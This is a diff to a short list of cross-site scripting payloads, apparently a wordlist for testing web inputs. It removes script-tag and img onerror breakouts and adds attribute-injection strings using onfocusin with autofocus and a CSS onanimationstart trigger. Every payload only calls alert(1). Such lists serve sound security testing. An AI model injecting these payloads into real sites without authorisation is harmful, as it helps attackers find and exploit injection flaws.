@@ -1,8 +1,4 @@
-"><script>alert(1)</script>
 " onmouseover="alert(1)
 " autofocus onfocus="alert(1)
-' onmouseover='alert(1)
-' autofocus onfocus='alert(1)
-"><img src=x onerror=alert(1)>
-" onclick="alert(1)
-/ onmouseover=alert(1)
+" onfocusin="alert(1)" autofocus="
+" style="animation-name:rotation" onanimationstart="alert(1)"
